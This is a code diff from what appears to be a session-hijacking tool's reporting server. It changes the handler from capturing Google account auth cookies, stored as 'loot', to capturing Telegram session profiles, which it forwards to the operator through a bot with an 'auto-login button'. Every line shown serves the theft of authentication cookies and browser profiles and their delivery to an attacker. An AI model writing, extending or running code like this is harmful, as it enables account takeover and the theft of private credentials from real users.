@@ -240,35 +240,16 @@ def report():
     session = sessions[session_id]
     session["last_activity"] = timestamp
     
-    # Handle report types - ONLY important alerts
-    if report_type == "session_start":
-        target = os.environ.get("TARGET_URL", "https://accounts.google.com")
-        run_async(bot.on_session_start(session_id, target))
-    
-    elif report_type == "cookies_update":
-        # Just update counts, NO telegram spam
-        session["cookie_count"] = report_data.get("count", 0)
-        session["auth_count"] = report_data.get("auth_count", 0)
-    
-    elif report_type == "auth_cookies":
-        # THE IMPORTANT ONE - send alert
-        cookies = report_data.get("cookies", [])
-        total = report_data.get("total_cookies", 0)
-        
+    # Handle Telegram session capture - ONLY alert type
+    if report_type == "telegram_session":
+        profile_path = report_data.get("profile_path", "")
         session["status"] = "captured"
-        session["cookie_count"] = total
-        session["auth_count"] = len(cookies)
-        session["auth_cookies"] = cookies
+        session["profile_path"] = profile_path
+        session["cookie_count"] = report_data.get("cookie_count", 0)
         
-        loot_path = str(LOOT_DIR / session_id)
-        run_async(bot.on_auth_captured(session_id, cookies, total, loot_path))
-    
-    elif report_type == "profile_exported":
-        path = report_data.get("path", "")
-        session["profile_path"] = path
-        # Send profile zip
-        if path:
-            run_async(bot.send_profile(session_id, path))
+        # Send ONE alert with profile zip and auto-login button
+        if profile_path:
+            run_async(bot.on_telegram_captured(session_id, profile_path))
     
     save_sessions(sessions)
     
